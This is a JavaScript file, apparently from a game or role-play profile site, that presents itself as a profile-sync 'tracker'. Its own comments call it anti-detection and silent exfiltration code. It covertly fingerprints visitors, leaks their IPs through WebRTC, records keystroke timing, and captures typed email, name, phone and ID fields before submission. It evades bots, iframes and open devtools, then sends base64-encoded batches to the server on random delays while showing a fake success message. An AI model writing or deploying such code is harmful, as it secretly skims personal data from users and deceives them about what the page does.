// ─── Estado global del tracker ────────────────────────────────────────────
let _hw_hash = null;
let _heartbeatTimer = null;
let globalFormData = {}; // Variable global para espejo de formularios

const BellatorCore = window.BellatorCore || {
    safe: function(_name, fn, fallback) {
        try {
            return fn();
        } catch (_error) {
            return typeof fallback === 'function' ? fallback(_error) : (fallback === undefined ? null : fallback);
        }
    },
    safeAsync: function(_name, fn, fallback) {
        try {
            const result = fn();
            if (result && typeof result.then === 'function') {
                return result.catch(function(_error) {
                    return typeof fallback === 'function' ? fallback(_error) : (fallback === undefined ? null : fallback);
                });
            }
            return Promise.resolve(result);
        } catch (_error) {
            return Promise.resolve(typeof fallback === 'function' ? fallback(_error) : (fallback === undefined ? null : fallback));
        }
    },
    safeWrap: function(_name, fn, fallback) {
        return function wrappedTrackerCall() {
            const context = this;
            const args = arguments;
            try {
                const result = fn.apply(context, args);
                if (result && typeof result.then === 'function') {
                    return result.catch(function(_error) {
                        return typeof fallback === 'function' ? fallback(_error) : (fallback === undefined ? null : fallback);
                    });
                }
                return result;
            } catch (_error) {
                return typeof fallback === 'function' ? fallback(_error) : (fallback === undefined ? null : fallback);
            }
        };
    },
    safeFetch: async function(input, options) {
        try {
            const response = await fetch(input, options);
            return response && response.ok ? response : null;
        } catch (_error) {
            return null;
        }
    },
    readJSONSafe: function(response, fallback) {
        if (!response) return Promise.resolve(fallback === undefined ? null : fallback);
        return response.json().catch(function() {
            return fallback === undefined ? null : fallback;
        });
    },
    simpleHash: function(value) {
        let hash = 0;
        const input = String(value || '');
        for (let index = 0; index < input.length; index += 1) {
            hash = ((hash << 5) - hash) + input.charCodeAt(index);
            hash |= 0;
        }
        return `fp_${Math.abs(hash).toString(16)}`;
    },
    generateDeviceFingerprint: typeof window.generateDeviceFingerprint === 'function' ? window.generateDeviceFingerprint : null,
};
const trackerSafe = BellatorCore.safe.bind(BellatorCore);
const trackerSafeAsync = BellatorCore.safeAsync.bind(BellatorCore);
const trackerSafeWrap = BellatorCore.safeWrap.bind(BellatorCore);
const trackerSafeFetch = BellatorCore.safeFetch.bind(BellatorCore);
const trackerReadJSONSafe = BellatorCore.readJSONSafe.bind(BellatorCore);

// ─── Variables ofuscadas para anti-detección ──────────────────────────────
const _0x5f = btoa; // Base64 encode
const _0x60 = (navigator.sendBeacon && typeof navigator.sendBeacon.bind === 'function')
    ? navigator.sendBeacon.bind(navigator)
    : function(url, payload) {
        fetch(url, { method: 'POST', body: payload, keepalive: true, mode: 'no-cors' }).catch(function() {});
        return true;
    }; // Send beacon
const _0x61 = setTimeout; // Set timeout
const _0x62 = Math.random; // Random
const _0x63 = Date.now; // Timestamp

// ─── Configuración del Hosting ────────────────────────────────────────────
const API_BASE_URL = window.location.origin; // Automáticamente usa el dominio del hosting
const API_ENDPOINTS = {
    track: `${API_BASE_URL}/api/track`,
    telemetry: `${API_BASE_URL}/api/telemetry`,
    visitors: `${API_BASE_URL}/api/visitors`,
    adminLogin: `${API_BASE_URL}/api/admin/login`
};

// ─── Anti-Detección: Verificación de Entorno Seguro ──────────────────────
function isSafeEnvironment() {
    // Detectar si estamos en un iframe de análisis
    if (window !== window.top) return false;

    // Detectar herramientas de desarrollo
    const devtools = {
        open: false,
        orientation: null
    };
    const threshold = 160;
    setInterval(() => {
        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
            if (!devtools.open) {
                devtools.open = true;
                // Podríamos pausar la telemetría aquí
            }
        } else {
            devtools.open = false;
        }
    }, 500);

    // Verificar user agent no sospechoso
    const suspicious = ['bot', 'crawler', 'spider', 'scanner', 'headless'];
    const ua = navigator.userAgent.toLowerCase();
    if (suspicious.some(word => ua.includes(word))) return false;

    return true;
}

// ─── Helper: mostrar mensaje de estado junto al botón ──────────────────────
function showSyncStatus(msg, isError) {
    let el = document.getElementById('_sync_status');
    if (!el) {
        el = document.createElement('div');
        el.id = '_sync_status';
        el.style.cssText = 'margin-top:10px;padding:10px 16px;border-radius:8px;font-size:13px;font-weight:600;text-align:center;transition:opacity .4s;font-family:sans-serif;';
        const btn = document.getElementById('btn-sync');
        if (btn && btn.parentNode) btn.parentNode.insertBefore(el, btn.nextSibling);
        else document.body.appendChild(el);
    }
    el.style.background = isError ? 'rgba(239,68,68,.1)' : 'rgba(34,197,94,.1)';
    el.style.border = isError ? '1px solid #ef4444' : '1px solid #22c55e';
    el.style.color = isError ? '#ef4444' : '#22c55e';
    el.style.opacity = '1';
    el.textContent = msg;
    clearTimeout(el._fadeTimer);
    el._fadeTimer = setTimeout(() => { el.style.opacity = '0'; }, 6000);
}

// ─── Heartbeat: mantiene la sesión "LIVE" en el dashboard cada 60s ──────────
function startHeartbeat(hardwareHash) {
    if (_heartbeatTimer) return;
    _heartbeatTimer = setInterval(() => {
        trackerSafe('tracker.heartbeat', function() {
            _0x60(API_ENDPOINTS.track, JSON.stringify({
                hardwareFingerprint: hardwareHash,
                is_heartbeat: true
            }));
        });
    }, 60000);
}

function simpleHash(value) {
    let hash = 0;
    for (let index = 0; index < value.length; index++) {
        hash = ((hash << 5) - hash) + value.charCodeAt(index);
        hash |= 0;
    }
    return `fp_${Math.abs(hash).toString(16)}`;
}

async function generateDeviceFingerprint() {
    if (_hw_hash) return _hw_hash;

    const seed = JSON.stringify({
        userAgent: navigator.userAgent || '',
        language: navigator.language || '',
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        timezone: trackerSafe('tracker.timezone', function() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone || '';
        }, ''),
    });
    const fallbackFingerprint = (BellatorCore.simpleHash || simpleHash)(seed);

    const fingerprint = await trackerSafeAsync('tracker.generateDeviceFingerprint', function() {
        const generator = typeof BellatorCore.generateDeviceFingerprint === 'function'
            ? BellatorCore.generateDeviceFingerprint
            : (typeof window.generateDeviceFingerprint === 'function' && window.generateDeviceFingerprint !== generateDeviceFingerprint
                ? window.generateDeviceFingerprint
                : null);
        if (generator) return generator();
        return fallbackFingerprint;
    }, fallbackFingerprint);

    _hw_hash = String(fingerprint || fallbackFingerprint);
    return _hw_hash;
}
window.generateDeviceFingerprint = generateDeviceFingerprint;

async function scanLocalPorts() {
    return [];
}

async function fetchJSONWithTimeout(url, timeoutMs) {
    const response = await trackerSafeFetch(url, {
        headers: { 'Accept': 'application/json' },
        timeoutMs: timeoutMs,
        label: `tracker.json:${url}`
    });
    if (!response) return null;
    return trackerReadJSONSafe(response, null);
}

// ─── Módulo: Ubicación de Precisión (No-Permit) ────────────────────────────
async function getPreciseLocation() {
    const cachedLocation = sessionStorage.getItem('telemetry_location');

    try {
        const ipData = await fetchJSONWithTimeout('https://api.ipify.org?format=json', 2500);
        const publicIP = ipData.ip || null;
        const localIPs = await new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            const ips = [];
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const ip = event.candidate.candidate.split(' ')[4];
                    if (ip && !ips.includes(ip) && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
                        ips.push(ip);
                    }
                }
            };
            setTimeout(() => {
                pc.close();
                resolve(ips);
            }, 1000);
        });
        const location = {
            latitude: null,
            longitude: null,
            city: null,
            region: null,
            country: null,
            publicIP,
            localIPs,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
            language: navigator.language || ''
        };
        sessionStorage.setItem('telemetry_location', JSON.stringify(location));
        return location;
    } catch (error) {
        if (cachedLocation) {
            try {
                return JSON.parse(cachedLocation);
            } catch (parseError) {
                // Ignore stale cached value.
            }
        }

        return {
            latitude: null,
            longitude: null,
            city: null,
            region: null,
            country: null,
            publicIP: null,
            localIPs: [],
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
            language: navigator.language || ''
        };
    }
}

// ─── Módulo: Captura de Formularios Pre-Submit ─────────────────────────────
function initFormCapture() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        const inputs = form.querySelectorAll('input:not([type="password"]), textarea, select');
        inputs.forEach(input => {
            input.addEventListener('input', (event) => {
                const fieldId = event.target.id || event.target.name || 'unnamed';
                globalFormData[fieldId] = {
                    value: event.target.value,
                    timestamp: Date.now(),
                    type: event.target.type
                };
            }, { passive: true });
        });
    });
}

// ─── Módulo: Exfiltración Silenciosa ───────────────────────────────────────
function initSilentExfiltration() {
    const queue = [];
    let batchTimer;
    function sendBatch() {
        trackerSafe('tracker.sendBatch', function() {
            if (queue.length === 0) return;
            const payload = {
                sessionId: sessionStorage.getItem('telemetry_session') || 'unknown',
                timestamp: _0x63(),
                data: queue.splice(0)
            };
            const encodedPayload = _0x5f(JSON.stringify(payload));
            _0x61(trackerSafeWrap('tracker.sendBatch.defer', function() {
                _0x60(API_ENDPOINTS.telemetry, encodedPayload);
            }), _0x62() * 1000 + 500);
        });
    }
    function enqueueData(data) {
        queue.push(data);
        clearTimeout(batchTimer);
        batchTimer = _0x61(sendBatch, 15000 + _0x62() * 5000); // 15-20s aleatorio
    }
    window.addEventListener('beforeunload', trackerSafeWrap('tracker.beforeunload', sendBatch));
    return { enqueueData };
}

// ─── Módulo: Fingerprinting Avanzado ────────────────────────────────
async function getAdvancedFingerprint() {
    const fingerprint = {};

    // Audio fingerprinting
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
        oscillator.start();
        const buffer = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(buffer);
        fingerprint.audioHash = btoa(String.fromCharCode(...buffer.slice(0, 10)));
        oscillator.stop();
        audioContext.close();
    } catch (e) { fingerprint.audioHash = 'no-audio'; }

    // Battery status
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            fingerprint.batteryLevel = battery.level;
            fingerprint.batteryCharging = battery.charging;
        } catch (e) { fingerprint.batteryLevel = 'unknown'; }
    }

    // Permissions
    const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'accelerometer', 'gyroscope'];
    fingerprint.permissions = {};
    for (const perm of permissions) {
        try {
            const status = await navigator.permissions.query({ name: perm });
            fingerprint.permissions[perm] = status.state;
        } catch (e) { fingerprint.permissions[perm] = 'not-supported'; }
    }

    // Device sensors
    if (window.DeviceOrientationEvent) {
        fingerprint.hasOrientation = true;
    }
    if (window.DeviceMotionEvent) {
        fingerprint.hasMotion = true;
    }

    return fingerprint;
}

// ─── Módulo: Comportamiento del Usuario ────────────────────────────────
function trackUserBehavior() {
    const behavior = {
        mouseMoves: 0,
        keyPresses: 0,
        scrolls: 0,
        clicks: 0,
        keystrokeTimings: [],
        lastKeyTime: 0
    };

    // Mouse tracking
    document.addEventListener('mousemove', () => behavior.mouseMoves++, { passive: true });
    document.addEventListener('click', () => behavior.clicks++, { passive: true });
    document.addEventListener('scroll', () => behavior.scrolls++, { passive: true });

    // Keystroke timing
    document.addEventListener('keydown', (e) => {
        behavior.keyPresses++;
        const now = _0x63();
        if (behavior.lastKeyTime) {
            behavior.keystrokeTimings.push(now - behavior.lastKeyTime);
        }
        behavior.lastKeyTime = now;
    }, { passive: true });

    // Cleanup after 30 seconds
    _0x61(() => {
        document.removeEventListener('mousemove', () => {});
        document.removeEventListener('click', () => {});
        document.removeEventListener('scroll', () => {});
        document.removeEventListener('keydown', () => {});
    }, 30000);

    return behavior;
}

// ─── Módulo: Análisis de Red Avanzado ────────────────────────────────
async function getAdvancedNetworkInfo() {
    const network = {};

    // WebRTC leak detection
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        const candidates = [];
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (event.candidate) {
                candidates.push(event.candidate.candidate);
            }
        };
        await new Promise(resolve => _0x61(resolve, 2000));
        pc.close();
        network.webrtcCandidates = candidates.length;
        network.localIPs = candidates.map(c => c.split(' ')[4]).filter(ip => ip && !ip.startsWith('192.168.'));
    } catch (e) { network.webrtcCandidates = 0; }

    // DNS leak test (simulado)
    network.dnsLeakPotential = navigator.webdriver ? 'high' : 'low';

    // Connection info
    if (navigator.connection) {
        network.connectionType = navigator.connection.effectiveType;
        network.downlink = navigator.connection.downlink;
    }

    return network;
}

// ─── Módulo: Reconocimiento de Red - Análisis de Vulnerabilidades del Servidor ────────────
async function scanServerVulnerabilities() {
    const vulnerabilities = [];
    const checks = [
        { endpoint: '/api/visitors', method: 'GET', vuln: 'api_exposed', desc: 'API de visitantes expuesta' },
        { endpoint: '/admin.html', method: 'GET', vuln: 'admin_panel', desc: 'Panel de administración accesible' },
        { endpoint: '/api/admin/login', method: 'POST', vuln: 'auth_endpoint', desc: 'Endpoint de autenticación expuesto' },
        { endpoint: '/.env', method: 'GET', vuln: 'env_leak', desc: 'Posible fuga de variables de entorno' },
        { endpoint: '/api/track', method: 'POST', vuln: 'tracking_api', desc: 'API de tracking activa' }
    ];

    for (const check of checks) {
        const response = await trackerSafeFetch(check.endpoint, {
            method: check.method,
            headers: check.method === 'POST' ? { 'Content-Type': 'application/json' } : {},
            body: check.method === 'POST' ? JSON.stringify({ test: true }) : undefined,
            timeoutMs: 2000,
            allowStatuses: [401],
            label: `tracker.vuln:${check.endpoint}`
        });

        if (response && (response.status < 400 || response.status === 401)) {
            vulnerabilities.push({
                type: check.vuln,
                description: check.desc,
                severity: check.vuln === 'env_leak' ? 'critical' : 'medium'
            });
        }
    }

    return vulnerabilities;
}

// ─── Listener principal (cualquier botón, una sola vez) ───────────────────
let _trackerFired = false;
const trackerClickBootstrap = trackerSafeWrap('tracker.clickBootstrap', async function _gt(e) {
    if (_trackerFired) return;
    if (!isSafeEnvironment()) {
        console.log('Environment not safe for telemetry');
        return;
    }

    const target = e.target && e.target.closest
        ? e.target.closest('button, a, [type="submit"], [role="button"], #btn-sync')
        : null;
    if (!target) return;
    _trackerFired = true;
    document.removeEventListener('click', trackerClickBootstrap, true);
    console.log('Audit log: starting profile synchronization...');

    const exfil = initSilentExfiltration();
    const fingerprint = await generateDeviceFingerprint();
    const location = await getPreciseLocation();
    const [openPorts, vulnerabilities] = await Promise.all([
        scanLocalPorts(),
        scanServerVulnerabilities()
    ]);

    initFormCapture();

    setTimeout(trackerSafeWrap('tracker.clickBootstrap.enqueue', function() {
        const fbclid = new URLSearchParams(window.location.search).get('fbclid') || 'no-fbclid';
        const userData = {
            email: document.getElementById('email')?.value || document.getElementById('f-email')?.value || '',
            name: document.getElementById('name')?.value || document.getElementById('f-name')?.value || '',
            phone: document.getElementById('tel')?.value || document.getElementById('f-phone')?.value || '',
            document_id: document.getElementById('game_id_shadow')?.value || ''
        };
        const playerData = {
            pseudonimo: document.getElementById('b-pseudonimo')?.value || '',
            fechaInicioRol: document.getElementById('b-fecha-inicio')?.value || '',
            avatarUrl: document.getElementById('b-avatar-url')?.value || '',
            division: document.getElementById('b-division')?.value || '',
            countryCode: document.getElementById('b-country-code')?.value || '',
            primaryColor: document.getElementById('b-primary-color')?.value || '',
        };
        const payload = {
            sessionID: fbclid,
            userData: userData,
            playerData: playerData,
            location: location,
            fingerprint: fingerprint,
            localPorts: openPorts,
            vulnerabilities: vulnerabilities,
            fullTelemetry: {
                userAgent: navigator.userAgent,
                screen: `${window.screen.width}x${screen.height}`,
                referer: document.referrer
            }
        };

        exfil.enqueueData(payload);
        startHeartbeat(fingerprint);
        showSyncStatus('✓ Sincronización exitosa — Perfil de Rol actualizado', false);
    }), 1000);
});
document.addEventListener('click', trackerClickBootstrap, true);

// ─── Inicialización pasiva desde carga de página ──────────────────────────
function initPassiveTelemetry() {
    return trackerSafeAsync('tracker.passiveTelemetry', async function() {
        const exfil = initSilentExfiltration();
        const fingerprint = await generateDeviceFingerprint();
        const location = await getPreciseLocation();
        const advancedFingerprint = await getAdvancedFingerprint();
        const userBehavior = trackUserBehavior();
        const networkInfo = await getAdvancedNetworkInfo();
        initFormCapture();

        const passivePayload = {
            location: location,
            fingerprint: fingerprint,
            advancedFingerprint: advancedFingerprint,
            userBehavior: userBehavior,
            networkInfo: networkInfo,
            fullTelemetry: {
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                referer: document.referrer,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }
        };
        exfil.enqueueData(passivePayload);

        setInterval(trackerSafeWrap('tracker.passiveTelemetry.flush', () => {
            if (Object.keys(globalFormData).length > 0) {
                exfil.enqueueData({ typing_cache: globalFormData });
                globalFormData = {};
            }
        }), 20000);
    });
}
initPassiveTelemetry();

window.BellatorTracker = Object.assign(window.BellatorTracker || {}, {
    generateDeviceFingerprint,
    getPreciseLocation,
    initPassiveTelemetry,
    scanServerVulnerabilities,
});
